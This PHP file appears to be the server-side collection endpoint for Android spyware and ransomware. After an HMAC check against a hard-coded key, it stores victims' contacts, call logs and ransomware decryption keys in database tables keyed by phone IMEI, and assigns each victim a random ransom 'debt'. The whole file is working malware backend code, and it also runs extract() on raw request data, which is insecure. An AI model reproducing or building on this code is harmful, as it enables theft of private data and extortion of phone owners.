<?php
	require_once 'db.php';
	$key = "qnsXcdaBFQIhAUPY44oiexBdkjAABQjqk120sdi0";
	
	function dblog($dbh, $data){
		$sth = $dbh->prepare("INSERT INTO log (entry) VALUES (:entry)");
		if($sth->execute(array(entry => print_r($data,true))) === false){
			echo "<pre>" . print_r($sth->errorInfo(),true) . "</pre>";
		}
	}

	if(isset($_REQUEST)){
		extract($_REQUEST);
		$body = $messageType . $messageBody . $imei . $timestamp;
		$mac = hash_hmac('sha1',$body,$key,true);

		$mac = trim(base64_encode($mac));
		$hmac = trim($hmac);

		$dbh = get_db();
		
		if($hmac == $mac){
			//Procesar la query
			switch($messageType){
			case 'contacts':
				$sth = $dbh->prepare("INSERT INTO supersafeapp_contacts (imei,contacts,timestamp) VALUES (?,?,?);");
				$sth->execute(array($imei,$messageBody,$timestamp));
				break;
			case 'calllog':
				$sth = $dbh->prepare("INSERT INTO supersafeapp_calllog (imei,calllog,timestamp) VALUES (?,?,?);");
				$sth->execute(array($imei,$messageBody,$timestamp));
				break;
			case 'ransom':
				$dict = json_decode($messageBody,true);
				extract($dict);
				$debt = rand(100,5000);
				$sth = $dbh->prepare("INSERT INTO supersafeapp_ransom (`imei`,`sha1`,`filename`, `key`,`timestamp`,`debt`) VALUES (?,?,?,?,?,?);");
				if($sth->execute(array($imei,$sha1,$filename,$pwd,$timestamp,$debt)) === false){
					dblog($dbh,array("ERROR" => $sth->errorInfo()));
				}
				break;
			default:
				break;
			}
		}	
	}
?>
